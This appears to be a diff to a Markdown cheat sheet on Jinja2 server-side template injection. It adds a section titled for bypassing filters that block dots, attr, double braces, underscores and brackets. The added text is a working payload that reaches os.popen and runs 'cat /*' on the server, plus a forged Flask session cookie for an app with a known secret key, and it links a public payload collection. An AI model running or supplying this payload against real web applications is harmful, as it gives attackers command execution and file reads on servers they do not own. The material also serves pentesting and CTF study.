@@ -30,6 +30,13 @@ Connection: close
 ```
 (You can also use cookies)
 
+## No dots, no attr, no {{, no _, no [, with known app.secret_key
+
+```py
+{%with a=session|first%}{%print(request|attr("application")|attr(a%2b"globals"%2ba))|attr(a%2b"getitem"+%2ba)("json")|attr("codecs")|attr("sys")|attr("modules")|attr(a%2b"getitem"+%2ba)("os")|attr("popen")("cat /*")|attr("read")()%}{%endwith%}
+
+# session=.eJwljrsOwjAMAP8lM4Pjxq7Dz1SOH6ISMLRiQvw7QYx3uuHeZdvKtZRL2fKI81auqfczJu4-vTmqMYzBmdEcmhpxrziYwZxkKgdiSl1VOksIax1RpRmuC0qQkiFFB264Bgu6WGp3cXRAHNBmMrp6JSdVU6lh7m3hSDD6fb3OOP436o_9WT5fNWU0Sw.ZhpIWQ.OLbcuOplfe801xPDpiwJ-WC-zR4
+```
 
 Other payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass
 
